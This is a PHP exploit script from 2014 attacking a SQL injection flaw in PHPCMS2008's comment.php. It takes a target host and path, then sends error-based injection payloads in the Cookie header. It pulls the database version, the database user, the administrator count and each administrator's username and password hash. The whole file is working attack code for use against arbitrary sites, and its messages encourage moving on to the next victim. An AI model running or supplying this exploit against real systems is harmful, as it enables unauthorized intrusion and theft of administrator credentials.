<?php
/**
 * Created by 独自等待
 * Date: 14-4-18
 * Time: 下午1:38
 * Name: phpcms2008_comment.php
 * 独自等待博客：http://www.waitalone.cn/
 */
print_r('
+------------------------------------------------------+
             PHPCMS2008 comment.php 注入EXP
             Site：http://www.waitalone.cn/
                Exploit BY： 独自等待
                  Time：2014-04-18
+------------------------------------------------------+
');
if ($argc < 3) {
    print_r('
+------------------------------------------------------+
Useage: php ' . $argv[0] . ' host path
Host: target server (ip/hostname)
Path: path of phpcms
Example: php ' . $argv[0] . ' localhost /phpcms
+------------------------------------------------------+
    ');
    exit;
}
error_reporting(7);
//统计时间
$start_time = func_time();
$host = $argv[1];
$path = $argv[2];

//显示注入数据
if (preg_match('/MySQL Query/i', send_pack('Fuck'))) {
    //数据库版本
    $db_exp = 'field=content=0x7c where (select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#';
    $db_ver = get_info($db_exp);
    echo '数据库版本: ' . $db_ver . PHP_EOL;
    //数据库用户
    $user_exp = 'field=content=0x7c where (select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#';
    $db_user = get_info($user_exp);
    echo '数据库用户: ' . $db_user . PHP_EOL;
    //获取用户表
    if (preg_match('/UPDATE (.*?)_comment/i', send_pack('Fuck'), $match)) {
        $member = $match[1] . '_member';
    } else {
        echo '爷，未找到用户表，请手工尝试一下！' . PHP_EOL;
    }
    //获取管理员数量
    $ad_exp = "field=content=0x7c where (select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,count(*),0x7e) FROM $member where groupid=1 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#";
    $ad_count = get_info($ad_exp);
    echo '管理员个数: ' . $ad_count . PHP_EOL;
    foreach (range(0, ($ad_count - 1)) as $i) {
        $admin = "field=content=0x7c where (select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,username,0x3a,password,0x7e) FROM $member where groupid=1 LIMIT $i,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#";
        echo '管理员' . $i . '-->' . get_info($admin) . PHP_EOL;
    }
} else {
    echo '报告爷，此站不存在此漏洞，请秒下一个！' . PHP_EOL;
}
//发送数据包函数
function send_pack($exp)
{
    global $host, $path;
    $data = "GET " . $path . "/comment/comment.php?action=vote HTTP/1.1\r\n";
    $data .= "Host: $host\r\n";
    //$data .= "User-Agent: Baiduspider\r\n";
    $data .= "Cookie: $exp\r\n";
    $data .= "Connection: Close\r\n\r\n";
    //echo $data;
    $fp = @fsockopen($host, 80, $errno, $errstr, 10);
    //echo ini_get('default_socket_timeout');//默认超时时间为60秒
    if (!$fp) {
        echo $errno . '-->' . $errstr . "\n";
        exit('Could not connect to: ' . $host);
    } else {
        fwrite($fp, $data);
        $back = '';
        while (!feof($fp)) {
            $back .= fread($fp, 1024);
        }
        fclose($fp);
    }
    return $back;
}

//提取返回信息
function get_info($info)
{
    preg_match('/~(.*)~1/i', send_pack($info), $admin_match);
    if (preg_match('/charset=utf-8/i', send_pack($info))) {
        return iconv('utf-8', 'gbk//IGNORE', $admin_match[1]);
    } else {
        return $admin_match[1];
    }
}

//时间统计函数
function func_time()
{
    list($microsec, $sec) = explode(' ', microtime());
    return $microsec + $sec;
}

echo '脚本执行时间：' . round((func_time() - $start_time), 4) . '秒。';
?> 
